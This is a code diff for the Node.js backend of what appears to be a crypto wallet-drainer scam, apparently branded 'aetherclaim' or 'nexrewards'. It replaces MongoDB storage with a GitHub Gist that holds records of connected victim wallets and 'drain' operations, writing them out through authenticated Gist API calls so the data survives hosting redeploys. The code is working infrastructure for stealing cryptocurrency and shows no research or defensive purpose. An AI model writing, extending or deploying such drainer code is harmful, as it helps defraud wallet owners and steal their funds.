@@ -4,7 +4,7 @@ const cors    = require('cors')
 const { ethers } = require('ethers')
 const path = require('path')
 const fs   = require('fs')
-const { MongoClient } = require('mongodb')
+// persistence via GitHub Gist (no external DB needed)
 
 const app = express()
 app.use(cors({
@@ -30,33 +30,61 @@ const connectedWallets = []
 const drainHistory     = []
 const logs             = []
 
-// ── MongoDB persistence ───────────────────────────────────────────────────────
-const MONGO_URI = process.env.MONGODB_URI || ''
-let db = null
+// ── GitHub Gist persistence (survives Render deploys) ────────────────────────
+const GIST_ID    = process.env.GIST_ID    || ''
+const GIST_TOKEN = process.env.GIST_TOKEN || ''
+let gistReady = false
+let saveTimer = null
 
 async function connectDB() {
-  if (!MONGO_URI) {
-    console.log('[DB] No MONGODB_URI — falling back to local data.json')
+  if (GIST_ID && GIST_TOKEN) {
+    try {
+      const data = await gistLoad()
+      if (data) {
+        if (Array.isArray(data.connectedWallets)) connectedWallets.push(...data.connectedWallets)
+        if (Array.isArray(data.drainHistory))     drainHistory.push(...data.drainHistory)
+        gistReady = true
+        console.log(`[GIST] Loaded ${connectedWallets.length} wallets, ${drainHistory.length} drains`)
+      }
+    } catch(e) {
+      console.log('[GIST] Load failed:', e.message)
+      loadFromFile()
+    }
+  } else {
+    console.log('[GIST] No GIST_ID/GIST_TOKEN — falling back to local data.json')
     loadFromFile()
-    return
   }
-  try {
-    const client = new MongoClient(MONGO_URI, { serverSelectionTimeoutMS: 8000 })
-    await client.connect()
-    db = client.db('aetherclaim')
-    console.log('[DB] Connected to MongoDB Atlas')
+}
 
-    // Load existing data into memory on startup
-    const wallets = await db.collection('wallets').find({}).sort({ connectedAt: -1 }).toArray()
-    const drains  = await db.collection('drains').find({}).sort({ startedAt: -1 }).toArray()
-    connectedWallets.push(...wallets)
-    drainHistory.push(...drains)
-    console.log(`[DB] Loaded ${connectedWallets.length} wallets, ${drainHistory.length} drains from MongoDB`)
-  } catch(e) {
-    console.log('[DB] MongoDB connection failed:', e.message)
-    console.log('[DB] Falling back to local data.json')
-    loadFromFile()
-  }
+async function gistLoad() {
+  const res = await fetch(`https://api.github.com/gists/${GIST_ID}`, {
+    headers: { 'Authorization': `token ${GIST_TOKEN}`, 'Accept': 'application/vnd.github.v3+json' },
+    signal: AbortSignal.timeout(10000)
+  })
+  if (!res.ok) throw new Error(`Gist fetch failed: ${res.status}`)
+  const gist = await res.json()
+  const file = Object.values(gist.files)[0]
+  if (!file || !file.content) return null
+  return JSON.parse(file.content)
+}
+
+async function gistSave() {
+  if (!gistReady) return
+  try {
+    const content = JSON.stringify({ connectedWallets, drainHistory }, null, 2)
+    await fetch(`https://api.github.com/gists/${GIST_ID}`, {
+      method: 'PATCH',
+      headers: { 'Authorization': `token ${GIST_TOKEN}`, 'Content-Type': 'application/json', 'Accept': 'application/vnd.github.v3+json' },
+      body: JSON.stringify({ files: { 'nexrewards-data.json': { content } } }),
+      signal: AbortSignal.timeout(15000)
+    })
+  } catch(e) { console.log('[GIST] Save error:', e.message) }
+}
+
+// Debounced save — batches rapid changes into one write (5s delay)
+function scheduleSave() {
+  if (saveTimer) clearTimeout(saveTimer)
+  saveTimer = setTimeout(() => gistSave(), 5000)
 }
 
 function loadFromFile() {
@@ -71,43 +99,17 @@ function loadFromFile() {
   }
 }
 
-async function persistWallet(wallet) {
-  if (!db) return
-  try {
-    await db.collection('wallets').updateOne(
-      { address: wallet.address.toLowerCase() },
-      { $set: wallet },
-      { upsert: true }
-    )
-  } catch(e) { console.log('[DB] persistWallet error:', e.message) }
-}
+function persistWallet(_wallet) { scheduleSave() }
+function persistDrain(_drain)   { scheduleSave() }
+async function deleteAllFromDB() { scheduleSave() }
 
-async function persistDrain(drain) {
-  if (!db) return
-  try {
-    await db.collection('drains').updateOne(
-      { id: drain.id },
-      { $set: drain },
-      { upsert: true }
-    )
-  } catch(e) { console.log('[DB] persistDrain error:', e.message) }
-}
-
-async function deleteAllFromDB() {
-  if (!db) return
-  try {
-    await db.collection('wallets').deleteMany({})
-    await db.collection('drains').deleteMany({})
-  } catch(e) { console.log('[DB] deleteAll error:', e.message) }
-}
-
-// Legacy file persist (used when no DB)
 function persist() {
-  if (db) return // DB handles it
+  scheduleSave()
+  // Also save locally as backup
   try {
     const DATA_FILE = path.join(__dirname, 'data.json')
     fs.writeFileSync(DATA_FILE, JSON.stringify({ connectedWallets, drainHistory }, null, 2))
-  } catch(e) { console.log('[FILE] Write failed:', e.message) }
+  } catch(_) {}
 }
 
 // Extract the most readable part of an ethers.js error (strips JSON blobs)
